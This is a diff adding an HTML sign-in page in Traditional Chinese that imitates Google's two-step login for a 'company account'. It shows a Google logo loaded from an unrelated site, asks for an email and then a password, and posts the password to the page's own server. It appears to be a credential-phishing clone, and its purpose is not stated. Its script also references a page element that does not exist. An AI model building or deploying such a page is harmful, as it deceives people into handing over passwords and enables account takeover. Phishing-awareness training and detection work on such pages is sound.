@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="zh-Hant">
+<head><meta charset="UTF-8"/>
+  <title>登入 - 公司帳戶</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <style type="text/css">body {
+    background-color: #202124;
+    color: #e8eaed;
+    font-family: Roboto, Arial, sans-serif;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    height: 100vh;
+    margin: 0;
+  }
+
+  .login-box {
+    background-color: #121212;
+    padding: 50px;
+    border-radius: 30px;
+    width: 800px;
+    box-shadow: 0 0 10px rgba(0,0,0,0.4);
+  }
+
+  .logo {
+    margin-bottom: 10px;
+  }
+
+  h1 {
+    font-size: 32px;
+    margin-top: 20px;
+    margin-bottom: 5px;
+    font-weight: 400;
+  }
+
+  .row {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-top: 20px;
+    gap: 10px;
+  }
+
+  .row span {
+    font-size: 16px;
+    white-space: nowrap;
+    padding-top: 14px;
+  }
+
+
+  .input-container {
+    position: relative;
+    width: 400px;
+  }
+
+  input {
+    width: 100%;
+    padding: 18px 12px;
+    background-color: transparent;
+    border: 0.7px solid #d1d1d1;
+    border-radius: 4px;
+    color: #e8eaed;
+    font-size: 20px;
+    outline: none;
+  }
+
+  label {
+    position: absolute;
+    top: 14px;
+    left: 12px;
+    color: #9aa0a6;
+    pointer-events: none;
+    transition: 0.2s ease all;
+    background-color: #171717;
+    padding: 0 4px;
+  }
+
+  input:focus + label,
+  input:not(:placeholder-shown) + label {
+    top: -8px;
+    font-size: 20px;
+    color: #8ab4f8;
+  }
+
+  input:focus {
+    border-color: #d1d1d1; /* 保持與未聚焦時相同的顏色 */
+  }
+
+  input:not(:placeholder-shown) + label {
+    color: #9aa0a6; /* 保持與未填入時相同的顏色 */
+  }
+
+  .btn {
+    background-color: #8ab4f8;
+    color: #202124;
+    border: none;
+    padding: 12px 20px;
+    border-radius: 24px;
+    font-weight: bold;
+    cursor: pointer;
+    float: right;
+    margin-top: 30px;
+  }
+
+  .help-link {
+    margin-top: 10px;
+  }
+
+  .help-link a, .footer a {
+    color: #8ab4f8;
+    text-decoration: none;
+    font-size: 14px
+  }
+
+  .footer {
+    margin-top: 40px;
+    font-size: 12px;
+    color: #9aa0a6;
+    text-align: center;
+  }
+
+  .account-info {
+    display: flex;
+    align-items: center;
+    background-color: transparent;
+    padding: 8px 12px;
+    border-radius: 24px;
+    cursor: pointer;
+    transition: background-color 0.2s;
+    width: fit-content;
+    margin-bottom: 20px;
+  }
+
+  .account-info:hover {
+    background-color: #3c4043;
+  }
+
+  .avatar {
+    width: 32px;
+    height: 32px;
+    border-radius: 50%;
+    margin-right: 12px;
+  }
+
+  .arrow-icon {
+    margin-left: 12px;
+  }
+  </style>
+</head>
+<body data-gr-ext-installed="" data-new-gr-c-s-check-loaded="14.1234.0" data-new-gr-c-s-loaded="14.1234.0">
+<div class="login-box">
+  <div class="logo"><img alt="Google Logo" src="https://www.markpollock.com/wp-content/uploads/2022/02/1200px-Google_-G-_Logo.svg.png" style="height: 40px;" /></div>
+
+  <h1 id="main-title">登入</h1>
+
+  <form action="" method="POST"><!-- Email 輸入區塊 -->
+    <div id="email-step">
+      <div class="row"><span>使用 Google 帳戶登入。</span>
+
+        <div class="input-container"><input id="email" placeholder=" " required="" type="email" /> <label for="email">電子郵件地址或電話號碼</label></div>
+      </div>
+
+      <div class="help-link"><a href="#">忘記電子郵件地址？</a></div>
+      <button class="btn" onclick="nextStep()" type="button">下一步</button></div>
+    <!-- Password 輸入區塊（預設隱藏） -->
+
+    <div id="password-step" style="display: none;">
+      <div class="account-info"><img alt="使用者頭像" class="avatar" src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" /> <svg class="arrow-icon" fill="#e8eaed" height="24" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"> <path d="M7 10l5 5 5-5z"></path> </svg></div>
+
+      <div class="row">
+        <div class="input-container"><input id="password" name="password" placeholder=" " required="" type="password" /> <label for="password">輸入你的密碼</label></div>
+      </div>
+
+      <div class="help-link"><a href="#">忘記密碼？</a></div>
+      <button class="btn" type="submit">登入</button></div>
+  </form>
+</div>
+<script>
+  function nextStep() {
+    const emailInput = document.getElementById("email");
+    if (emailInput.checkValidity()) {
+      const email = emailInput.value;
+
+      document.getElementById("email-step").style.display = "none";
+      document.getElementById("password-step").style.display = "block";
+
+      document.getElementById("main-title").textContent = "歡迎使用";
+
+      document.getElementById("welcome-msg").textContent = email;
+    } else {
+      emailInput.reportValidity();
+    }
+  }
+</script></body>
+<grammarly-desktop-integration data-grammarly-shadow-root="true"></grammarly-desktop-integration></html>
